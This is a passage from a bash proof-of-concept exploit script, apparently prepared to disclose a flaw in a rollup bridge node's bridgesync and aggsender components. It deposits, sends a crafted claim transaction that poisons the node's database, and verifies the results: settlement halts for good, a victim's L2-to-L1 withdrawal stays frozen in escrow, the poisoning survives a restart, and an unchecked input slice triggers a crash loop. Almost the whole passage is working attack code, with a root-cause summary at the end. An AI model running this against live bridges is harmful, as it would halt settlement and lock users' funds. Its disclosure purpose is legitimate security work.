decode_deposit deposit1 || die "no BridgeEvent in deposit #1 receipt (bridgeAsset ABI mismatch?)"
echo "  BridgeEvent: leafType=$DEP_LT origNet=$DEP_ON token=$DEP_OTOK idx=$DEP_IDX meta=$DEP_META"
check "deposit #1 accepted (on-chain depositCount == 1)" \
  test "$(q_uint "$BRIDGE_L1" 'depositCount()(uint32)' "$L1_RPC")" = 1

MER1=$(q_hash "$GER_L1" 'mainnetExitRoot()' "$L1_RPC") || die "cannot read mainnetExitRoot"
RER=$(q_hash "$GER_L1" 'rollupExitRoot()' "$L1_RPC")   || die "cannot read rollupExitRoot"
calibrate "$MER1" || die "calibration failed: no SMT zero convention matches on-chain MER. Compare against the BridgeEvent above and adjust DEP_LEAF construction."
use_ladder "$CAL_LAD"
echo "  calibrated: SMT zero convention = $CAL_LAD"
LEAF0="$DEP_LEAF"; GI0_HEX=$(gi_hex 0); GI0_DEC=$(gi_dec 0)
PROOF0=$(blob "${Z_LAD[@]}")

deploy_poison

# a normal L2->L1 exit BEFORE the attack, so a certificate is actually built
send_bridge "$L2_RPC" "$PK_ATK" 1 "$ATTACKER" "$AMOUNT" "0x" l2bridge_before "$BRIDGE_L2" \
  || die "l2 bridge (before) failed"

poll_check "GER #1 propagated to L2 by AggOracle — control claim simulation passes" 600 \
  sim_claim "$CLAIM_SIG" "$PROOF0" "$GI0_HEX" "$MER1" "$RER" "$DEP_META" \
  || die "control claim never became valid (GER propagation — docker logs $NODE | grep -i oracle)"

send_claim "$CLAIM_SIG" control_claim "$PROOF0" "$GI0_HEX" "$MER1" "$RER" "$DEP_META" \
  || die "control claim failed — see $EV/receipt_control_claim.err"
claim_receipt_ok control_claim || die "control claim receipt invalid (status/logs)"
check "BEFORE: control claim mined — status=1, exactly 1 ClaimEvent" true
GER_CTL=$(kk2 "$MER1" "$RER")

poll_check "BEFORE: certificate build includes the control claim (log: numClaims: 1)" 900 grep_numclaims 1
check "BEFORE: aggsender has ZERO errors (healthy settlement)" test "$(err_count)" = 0
poll_check "BEFORE: bridgesync stored the VALID calldata (DB GER matches on-chain GER)" 300 \
  db_row_ger "$GI0_DEC" "$GER_CTL"
check_warn "BEFORE: certificate sent to AggLayer ('sent successfully')" grep_log "sent successfully"
db_dump before
ERR_BEFORE=$(err_count); CERT_BEFORE=$(cert_count)

# ============================================================================
log "P2: EXPLOIT — ONE ATTACK TRANSACTION"
send_bridge "$L1_RPC" "$PK_ATK" 0 "$ATTACKER" "$AMOUNT" "0x02" deposit2 "$BRIDGE_L1" \
  || die "deposit #2 failed"
ok_tx deposit2 || die "deposit #2 status != 1"
decode_deposit deposit2 || die "no BridgeEvent in deposit #2 receipt"
LEAF1="$DEP_LEAF"; GI1_HEX=$(gi_hex 1); GI1_DEC=$(gi_dec 1); GI1_64=$(gi64 1)
MER2=$(q_hash "$GER_L1" 'mainnetExitRoot()' "$L1_RPC")
check "exit-tree math self-check: on-chain MER == computed root over [leaf0, leaf1]" \
  test "$MER2" = "$(root_pair "$LEAF0" "$LEAF1")"
PROOF1=$(blob "$LEAF0" "${Z_LAD[@]:1}")

poll_check "GER #2 propagated to L2 — attack claim simulation passes" 600 \
  sim_claim "$ATTACK_SIG" "$PROOF1" "$GI1_HEX" "$MER2" "$RER" "$DEP_META" \
  || die "attack claim never became valid"

ATTACK_OFF=$(stat -c %s "$EV/node.log")
send_claim "$ATTACK_SIG" attack "$PROOF1" "$GI1_HEX" "$MER2" "$RER" "$DEP_META" \
  || die "attack tx failed — see $EV/receipt_attack.err"
claim_receipt_ok attack || die "attack receipt invalid — outer tx must succeed with exactly ONE ClaimEvent"
check "EXPLOIT: attack tx mined — status=1, exactly ONE ClaimEvent" true
ATTACK_TX=$(jq -r '.transactionHash' "$EV/receipt_attack.json")
echo "  attack tx: $ATTACK_TX"

fetch_trace "$ATTACK_TX" trace_attack.json
check "trace: >= 2 claimAsset calls to the bridge in ONE tx" \
  test "$(tr_count all)" -ge 2
check "trace: exactly 1 claimAsset frame WITHOUT error (the valid claim)" \
  test "$(tr_count valid)" -eq 1
check "trace: >= 1 claimAsset frame WITH error + SAME globalIndex (reverted call is still recorded — root cause: no Err check)" \
  test "$(tr_count junk "$GI1_64")" -ge 1

# a normal L2->L1 exit AFTER the attack: forces the next certificate build to
# include the poisoned claim (aggsender skips building when numBridges == 0)
send_bridge "$L2_RPC" "$PK_ATK" 1 "$ATTACKER" "$AMOUNT" "0x" l2bridge_after "$BRIDGE_L2" \
  || die "l2 bridge (after) failed"

# ============================================================================
log "P3: AFTER — POISONED DATABASE + ERROR LOOP"
poll_check "AFTER: aggsender certificate build FAILS on the poisoned claim (error loop starts)" 900 err_at_least 1
check "AFTER: error repeats every epoch of 6s (>= 5 occurrences)" err_at_least 5
check "AFTER: bridgesync DB row for the attack claim stores the POISONED GER (not the valid one)" \
  db_row_ger "$GI1_DEC" "$JUNK_GER"
check "AFTER: poisoned row carries JUNK mainnet/rollup exit roots (overwrite proof)" \
  db_row_junk "$GI1_DEC"
check "AFTER: the CONTROL claim row is still valid (only the new claim was overwritten)" \
  db_row_ger "$GI0_DEC" "$GER_CTL"
db_dump after

# ============================================================================
log "P4: IMPACT — SETTLEMENT HALT, OBSERVED ${WATCH_MIN} MINUTES"
for m in $(seq 1 "$WATCH_MIN"); do
  sleep 60
  echo "    [${m}/${WATCH_MIN} min] errors=$(err_count) certs=$(cert_count)"
done
CERT_AFTER=$(cert_count)
check "IMPACT: certificate count FROZEN (${CERT_BEFORE} -> ${CERT_AFTER})" \
  test "$CERT_AFTER" = "$CERT_BEFORE"
check "IMPACT: certificate FromBlock is PINNED post-attack (settlement can never advance)" \
  sh -c "tail -c +$((ATTACK_OFF+1)) '$EV/node.log' | grep -oE 'FromBlock: [0-9]+' | sort -u | wc -l | grep -q '^[01]\$'"
check "IMPACT: error loop still accumulating (>= $((5 + WATCH_MIN*5)) errors)" \
  err_at_least $((5 + WATCH_MIN*5))
ERR_FINAL=$(err_count)
PINNED_FB=$(tail -c +$((ATTACK_OFF+1)) "$EV/node.log" | grep -oE 'FromBlock: [0-9]+' | tail -n1)

# ============================================================================
log "P5: IMPACT — VICTIM FUNDS FROZEN (withdrawal AFTER the attack)"
VICTIM_INFO=$(cast wallet new)
VICTIM=$(printf '%s\n' "$VICTIM_INFO" | grep -oE '0x[0-9a-fA-F]{40}' | head -n1)
PK_VIC=$(printf '%s\n' "$VICTIM_INFO" | grep -oE '0x[0-9a-fA-F]{64}' | head -n1)
[ -n "$VICTIM" ] && [ -n "$PK_VIC" ] || die "cast wallet new failed"
echo "  victim: $VICTIM (fresh account, funded with 1 ETH)"
cast send "$VICTIM" --value 1ether --rpc-url "$L2_RPC" --private-key "$PK_ATK" --json \
  >"$EV/receipt_fund_victim.json" 2>/dev/null || die "funding victim failed"
V_B0=$(cast balance "$VICTIM" --rpc-url "$L2_RPC"); E_B0=$(cast balance "$BRIDGE_L2" --rpc-url "$L2_RPC")

send_bridge "$L2_RPC" "$PK_VIC" 1 "$VICTIM" "$AMOUNT" "0x" victim_withdrawal "$BRIDGE_L2" \
  || die "victim withdrawal failed"
V_B1=$(cast balance "$VICTIM" --rpc-url "$L2_RPC"); E_B1=$(cast balance "$BRIDGE_L2" --rpc-url "$L2_RPC")
check "victim withdrawal SUCCEEDED on L2 (funds left the user)" \
  sh -c "test $((V_B0 - V_B1)) -ge $AMOUNT"
check "victim funds are now held by the L2 bridge escrow (+ exactly the amount)" \
  sh -c "test $((E_B1 - E_B0)) -eq $AMOUNT"
check "victim exit is VISIBLE to bridgesync (bridge table >= 3 rows) while settlement is dead" \
  sh -c "test $(db_bridge_count) -ge 3"
echo "  => no certificate can ever be built => exit root never reaches L1"
echo "     => the victim can NEVER claim on L1: FUNDS ARE FROZEN"

# ============================================================================
log "P6: IMPACT — POISONING SURVIVES NODE RESTART (persistent)"
docker restart "$NODE" >/dev/null 2>&1 || die "docker restart failed"
poll_check "cdk-node back UP after restart" 300 node_up
E0=$(err_count)
poll_check "IMPACT: error loop RESUMES after restart (no auto-recovery — poisoned SQLite)" 900 err_gt "$E0"
check "IMPACT: poisoned DB row still present after restart" db_row_ger "$GI1_DEC" "$JUNK_GER"
db_dump post_restart

# ============================================================================
if [ "$RUN_CRASH" = 1 ]; then
  log "P7: VARIANT A — unguarded input[:4] => CRASH LOOP"
  send_bridge "$L1_RPC" "$PK_ATK" 0 "$ATTACKER" "$AMOUNT" "0x03" deposit3 "$BRIDGE_L1" \
    || die "deposit #3 failed"
  ok_tx deposit3 || die "deposit #3 status != 1"
  decode_deposit deposit3 || die "no BridgeEvent in deposit #3 receipt"
  LEAF2="$DEP_LEAF"; GI2_HEX=$(gi_hex 2)
  MER3=$(q_hash "$GER_L1" 'mainnetExitRoot()' "$L1_RPC")
  check "exit-tree math self-check after deposit #3" \
    test "$MER3" = "$(root_triple "$LEAF0" "$LEAF1" "$LEAF2")"
  PROOF2=$(blob "${Z_LAD[0]}" "$(kk2 "$LEAF0" "$LEAF1")" "${Z_LAD[@]:2}")

  poll_check "GER #3 propagated — crash claim simulation passes" 600 \
    sim_claim "$CRASH_SIG" "$PROOF2" "$GI2_HEX" "$MER3" "$RER" "$DEP_META" \
    || die "crash claim never became valid"
  send_claim "$CRASH_SIG" attack_crash "$PROOF2" "$GI2_HEX" "$MER3" "$RER" "$DEP_META" \
    || die "crash tx failed"
  claim_receipt_ok attack_crash || die "crash receipt invalid"
  check "VARIANT A: crash tx mined — status=1, exactly ONE ClaimEvent" true
  fetch_trace "$(jq -r '.transactionHash' "$EV/receipt_attack_crash.json")" trace_crash.json
  check "VARIANT A: trace contains a bridge call with input < 4 bytes" \
    sh -c "test \$(jq --arg b '$BRIDGE_L2' '[..|objects|select(((.to//\"\")|ascii_downcase)==(\$b|ascii_downcase))|select((((.input//\"0x\")|length)-2)/2 < 4)]|length' '$EV/trace_crash.json') -ge 1"
  poll_check "VARIANT A: cdk-node PANICS and enters a crash-restart loop (RestartCount >= 2)" 600 \
    sh -c "test $(restart_count) -ge 2"
  check "VARIANT A: panic in log — 'slice bounds out of range'" \
    grep_log "slice bounds out of range"
  RESTARTS=$(restart_count)
else
  RESTARTS="-"
fi

# ============================================================================
log "SUMMARY"
printf '
  ======================================================================
   BEFORE / AFTER EXPLOIT
  ======================================================================
   certificate build errors   : %s                    -> %s  (every 6s, forever)
   certificates on disk       : %s                    -> %s  (FROZEN)
   settlement range           : advancing             -> PINNED at FromBlock %s
   bridgesync claim rows      : 1 (VALID GER)         -> 2 (last one POISONED:
                                 GER 0x%s)
   victim (fresh account)     : withdrawal OK on L2   -> funds stuck in escrow
                                 balance %s -> %s wei
                                 escrow  %s -> %s wei
   node restart               : -                     -> error RESUMES (persistent)
   crash loop (Variant A)     : -                     -> restarts: %s

   Root cause (bridgesync/downloader.go):
     1. methodID := input[:4]              — no length check   (Variant A)
     2. reverted call frames are parsed    — "error" field unchecked
     3. LIFO stack + match on globalIndex  — poisoned call overwrites
        only                                     the valid claim calldata
   Impact (aggsender): certificate build fails forever => settlement halt
   => all post-attack L2->L1 exits are frozen.
  ======================================================================
' "$ERR_BEFORE" "$ERR_FINAL" "$CERT_BEFORE" "$CERT_AFTER" "${PINNED_FB:-?}" \
  "$(GER_CLEAN "$JUNK_GER" | cut -c1-16)…" "$V_B0" "$V_B1" "$E_B0" "$E_B1" "$RESTARTS"

printf '\n---- RESULTS ----\n'
for r in "${RESULTS[@]}"; do printf '[%s] %s\n' "${r%%|*}" "${r#*|}"; done
printf '\nEvidence bundle: %s\n' "$EV"
ls "$EV"

fails=0; for r in "${RESULTS[@]}"; do case "$r" in FAIL*) fails=$((fails+1));; esac; done
[ "$fails" -gt 0 ] && echo "HARD FAILURES: $fails"
exit $(( fails > 0 ? 1 : 0 ))
